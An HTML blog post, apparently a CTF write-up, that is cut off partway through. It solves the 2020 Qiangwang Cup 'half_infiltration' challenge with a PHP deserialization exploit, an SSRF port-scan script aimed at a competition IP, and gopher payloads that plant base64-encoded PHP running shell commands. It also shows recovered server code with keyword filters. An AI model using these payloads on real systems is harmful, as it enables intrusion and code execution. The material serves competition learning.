@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    2020强网杯部分题目writeup |
+    
+    Mount4in</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-2020强网杯部分题目writeup" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2020强网杯部分题目writeup
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/" class="article-date">
+  <time datetime="2020-08-24T02:04:19.000Z" itemprop="datePublished">2020-08-24</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        
+        <p>前言 </p>
+<a id="more"></a>
+
+<h1 id="0x01-half-infiltration"><a href="#0x01-half-infiltration" class="headerlink" title="0x01 half_infiltration"></a>0x01 half_infiltration</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$flag=file_get_contents(<span class="string">'ssrf.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">global</span> $result;</span><br><span class="line">        <span class="keyword">print</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age,$sex,$num;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $student = <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">        $boy = <span class="keyword">$this</span>-&gt;sex;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;num;</span><br><span class="line">    	$student-&gt;$boy();</span><br><span class="line">    	<span class="keyword">if</span>(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student)))</span><br><span class="line">    	&#123;</span><br><span class="line">        	ob_end_clean();</span><br><span class="line">        	<span class="keyword">exit</span>();</span><br><span class="line">    	&#125;</span><br><span class="line">   	 	<span class="keyword">global</span> $$a;</span><br><span class="line">    	$result=$GLOBALS[<span class="string">'flag'</span>];</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x'</span>])) &#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'x'</span>])-&gt;get_it();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一层是一道反序列化题目，添加了限制，首先调用了<code>$student-&gt;$boy();</code>，然后再将flag赋给全局变量<code>$result</code>，如果在赋flag值之前，就调用Pass类的read()方法是读不到flag的，所以需要首先进行一遍完整的<code>User</code>的<code>__destruct()</code>函数，将flag赋给<code>$result</code>,然后再执行一遍<code>__destruct()</code>，继续调用<code>$student-&gt;$boy();</code>来触发Pass类的read()函数，读取flag；接下来再读flag时发现在<code>ob_start()</code>和<code>ob_end_clean()</code>之间的<code>print</code>是输出不到屏幕的，这里有两种方法可以绕过：</p>
+<ol>
+<li>在<code>ob_end_clean()</code>执行前寻找一条触发到执行到exit()的链。</li>
+<li>在<code>ob_end_clean()</code>前报错，直接停止执行。</li>
+</ol>
+<p>本题选择第二种，在<code>print $result</code>与<code>ob_end_clean()</code>之间只有只有is_string()和global 两条语句，通过测试发现</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">va</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$a = <span class="string">"this"</span>;</span><br><span class="line">		<span class="keyword">global</span> $$a;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> va();</span><br><span class="line">$b-&gt;a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//执行会报错</span></span><br></pre></td></tr></table></figure>
+
+<p>exp:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		ob_start();</span><br><span class="line">		<span class="keyword">global</span> $result;</span><br><span class="line">		<span class="keyword">print</span> $result;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $age, $sex, $num;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$student = <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">		$boy = <span class="keyword">$this</span>-&gt;sex;</span><br><span class="line">		$a = <span class="keyword">$this</span>-&gt;num;</span><br><span class="line">		$student-&gt;$boy();</span><br><span class="line">		<span class="keyword">if</span> (!(is_string($a)) || !(is_string($boy)) || !(is_object($student))) &#123;</span><br><span class="line">			ob_end_clean();</span><br><span class="line">			<span class="keyword">exit</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">global</span> $$a;</span><br><span class="line">		$result = $GLOBALS[<span class="string">'flag'</span>];</span><br><span class="line">		ob_end_clean();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Pass();</span><br><span class="line"></span><br><span class="line">$b2 = <span class="keyword">new</span> User();</span><br><span class="line">$b2-&gt;sex = <span class="string">"read"</span>;</span><br><span class="line">$b2-&gt;num = <span class="string">"this"</span>;</span><br><span class="line">$b2-&gt;age = $a;</span><br><span class="line"></span><br><span class="line">$d = <span class="keyword">new</span> <span class="keyword">Exception</span>;</span><br><span class="line">$b = <span class="keyword">new</span> User();</span><br><span class="line">$b-&gt;sex = <span class="string">"getCode"</span>;</span><br><span class="line">$b-&gt;num = <span class="string">"result"</span>;</span><br><span class="line">$b-&gt;aa = $b2;</span><br><span class="line">$b-&gt;age = $d;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line"><span class="comment">//O%3A4%3A%22User%22%3A4%3A%7Bs%3A3%3A%22age%22%3BO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A41%3A%22D%3A%5C%E6%AF%94%E8%B5%9B202006%5C%E5%BC%BA%E7%BD%91%E6%9D%AF%5Cban+pen%5Cexp.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A37%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7Ds%3A3%3A%22sex%22%3Bs%3A7%3A%22getCode%22%3Bs%3A3%3A%22num%22%3Bs%3A6%3A%22result%22%3Bs%3A2%3A%22aa%22%3BO%3A4%3A%22User%22%3A3%3A%7Bs%3A3%3A%22age%22%3BO%3A4%3A%22Pass%22%3A0%3A%7B%7Ds%3A3%3A%22sex%22%3Bs%3A4%3A%22read%22%3Bs%3A3%3A%22num%22%3Bs%3A4%3A%22this%22%3B%7D%7D</span></span><br></pre></td></tr></table></figure>
+
+<p>得到ssrf.php</p>
+<p>image-20200824111939809</p>
+<p>第二层利用ssrf.php探测内网，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://172.26.98.147:"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35000</span>,<span class="number">50000</span>):</span><br><span class="line">	url = <span class="string">"http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://172.26.98.147:"</span></span><br><span class="line">	url+=str(i)</span><br><span class="line">	re=requests.get(url)</span><br><span class="line">	<span class="keyword">print</span> url</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"HTTP"</span> <span class="keyword">in</span> re.text:</span><br><span class="line">		<span class="keyword">print</span> url</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>得到在40000端口开了服务，</p>
+<p><img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200824112617077.png" alt="image-20200824112617077"></p>
+<p>是一个评论框，可以传file和content两个参数，在<a href="http://127.0.0.1:40000/uploads/可以看到文件夹，文件夹的名对应phpsessid值，利用gopher协议ssrf可以在uploads目录写文件。" target="_blank" rel="noopener">http://127.0.0.1:40000/uploads/可以看到文件夹，文件夹的名对应phpsessid值，利用gopher协议ssrf可以在uploads目录写文件。</a></p>
+<p>比赛时直接用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;172.26.98.147:40000&#x2F;_POST%20&#x2F;%20HTTP&#x2F;index.php1.1%250d%250aHost:127.0.0.1:40000%250d%250aContent-Type:application&#x2F;x-www-form-urlencoded%250d%250aCookie:%20PHPSESSID&#x3D;o151hrta2onlamvpvsq9695785;%250d%250aContent-Length:%2083%250d%250a%250d%250afile&#x3D;php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3Da.php%26content&#x3D;PD89cGhwaW5mbygpOyAg</span><br></pre></td></tr></table></figure>
+
+<p>就可以得到phpinfo，但是后来复现时，就不可以了，感觉题目被改了。23333</p>
+<p>之后修改content，绕过过滤得到flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;172.26.98.147:40000&#x2F;_POST%20&#x2F;%20HTTP&#x2F;index.php1.1%250d%250aHost:127.0.0.1:40000%250d%250aContent-Type:application&#x2F;x-www-form-urlencoded%250d%250aCookie:%20PHPSESSID&#x3D;o151hrta2onlamvpvsq9695785;%250d%250aContent-Length:%2087%250d%250a%250d%250afile&#x3D;php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3Db.php%26content&#x3D;MjM8Pz1gY2F0IC9mbGFnYDsg</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200824141727459.png" alt="image-20200824141727459" style="zoom: 200%;">
+
+<p>content-length:长度直接本地开一个一摸一样的服务，看下长度即可，</p>
+<img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200824141850604.png" alt="image-20200824141850604" style="zoom:150%;">
+
+<p>成功写入文件，得到flag,</p>
+<p><img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200824141758218.png" alt="image-20200824141758218"></p>
+<p>尝试读取源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">23&lt;?&#x3D;&#96;cat  ..&#x2F;..&#x2F;in*ex.***&#96;;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200824142827863.png" alt="image-20200824142827863" style="zoom:200%;">
+
+<p>下面是做题时读取的服务器文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#ini_set('display_errors', 'on');</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span> <span class="string">'del.php'</span>;</span><br><span class="line">$upload_dir = sprintf(<span class="string">"./uploads/%s/"</span>, session_id());</span><br><span class="line">$id = session_id();</span><br><span class="line">@mkdir($upload_dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">chdir($upload_dir);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'.'</span>);</span><br><span class="line"><span class="keyword">foreach</span> (glob(getcwd() . <span class="string">'/*'</span>) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">	<span class="keyword">if</span> (is_file($file)) &#123;</span><br><span class="line">		unlink($file);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (time() - filemtime($file) &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">			Delete($file);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = <span class="string">""</span>;</span><br><span class="line">$filename = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'file'</span>])) &#123;</span><br><span class="line">	$filename = $_POST[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">if</span> (stripos($filename, <span class="string">'BE'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($filename, <span class="string">'write'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($filename, <span class="string">'zlib'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($filename, <span class="string">'sto'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'content'</span>])) &#123;</span><br><span class="line">			$data = $_POST[<span class="string">'content'</span>];</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (stripos($data, <span class="string">'ph'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'Pz4='</span>) === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'&lt;?'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'PD9wa'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'script'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'='</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">				file_put_contents($filename, $data);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//del.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Delete</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (is_dir($path) === <span class="keyword">true</span>) &#123;</span><br><span class="line">		$files = <span class="keyword">new</span> RecursiveIteratorIterator(<span class="keyword">new</span> RecursiveDirectoryIterator($path), RecursiveIteratorIterator::CHILD_FIRST);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">foreach</span> ($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">			<span class="keyword">if</span> (in_array($file-&gt;getBasename(), <span class="keyword">array</span>(<span class="string">'.'</span>, <span class="string">'..'</span>)) !== <span class="keyword">true</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span> ($file-&gt;isDir() === <span class="keyword">true</span>) &#123;</span><br><span class="line">					rmdir($file-&gt;getPathName());</span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (($file-&gt;isFile() === <span class="keyword">true</span>) || ($file-&gt;isLink() === <span class="keyword">true</span>)) &#123;</span><br><span class="line">					unlink($file-&gt;getPathname());</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> rmdir($path);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((is_file($path) === <span class="keyword">true</span>) || (is_link($path) === <span class="keyword">true</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> unlink($path);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下面是复现时读的服务器文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#ini_set('display_errors', 'on');</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'del.php'</span>);</span><br><span class="line">$upload_dir = sprintf(<span class="string">"./uploads/%s/"</span>, session_id());</span><br><span class="line">$id=session_id();</span><br><span class="line">@mkdir($upload_dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">chdir($upload_dir);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'.'</span>);</span><br><span class="line"><span class="keyword">foreach</span> (glob(getcwd().<span class="string">'/*'</span>) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_file($file)) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (time() - filemtime($file) &gt;= <span class="number">200</span>) &#123;</span><br><span class="line">            Delete($file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = <span class="string">""</span>;</span><br><span class="line">$filename = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'file'</span>]) ) &#123;</span><br><span class="line">	$filename = $_POST[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">if</span>(stripos($filename, <span class="string">'..'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($filename, <span class="string">'BE'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($filename, <span class="string">'write'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($filename, <span class="string">'zlib'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($filename, <span class="string">'sto'</span>)  === <span class="keyword">false</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'content'</span>])) &#123;</span><br><span class="line">            $data = $_POST[<span class="string">'content'</span>];</span><br><span class="line">	    </span><br><span class="line">	    <span class="keyword">if</span> (stripos($data, <span class="string">'`'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'ll'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'PD8'</span>)  === <span class="keyword">false</span>   &amp;&amp;stripos($data, <span class="string">'-'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'ww'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'6'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'7'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'rm'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'mr'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'sy'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'ys'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'ph'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'Pz4='</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'&lt;?'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'PD9wa'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'script'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'='</span>)  === <span class="keyword">false</span>) &#123;</span><br><span class="line">                file_put_contents($filename, $data);</span><br><span class="line">	    &#125;</span><br><span class="line">	</span><br><span class="line">	&#125; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>对比发现在file处加了<code>..</code>的过滤，在content中加了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">stripos($data, <span class="string">'`'</span>)  === <span class="keyword">false</span> 		&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'ll'</span>)  === <span class="keyword">false</span> 	&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'PD8'</span>)  === <span class="keyword">false</span>   	&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'-'</span>)  === <span class="keyword">false</span>		&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'ww'</span>)  === <span class="keyword">false</span> 	&amp;&amp; </span><br><span class="line">stripos($data, <span class="string">'6'</span>)  === <span class="keyword">false</span>		&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'7'</span>)  === <span class="keyword">false</span>		&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'rm'</span>)  === <span class="keyword">false</span> 	&amp;&amp; </span><br><span class="line">stripos($data, <span class="string">'mr'</span>)  === <span class="keyword">false</span> 	&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'sy'</span>)  === <span class="keyword">false</span> 	&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'ys'</span>)  === <span class="keyword">false</span></span><br></pre></td></tr></table></figure>
+
+<p>上面这些过滤。</p>
+<h1 id="0x02-dice2cry"><a href="#0x02-dice2cry" class="headerlink" title="0x02 dice2cry"></a>0x02 dice2cry</h1><p>题目泄露了源码，abi.php.bak</p>
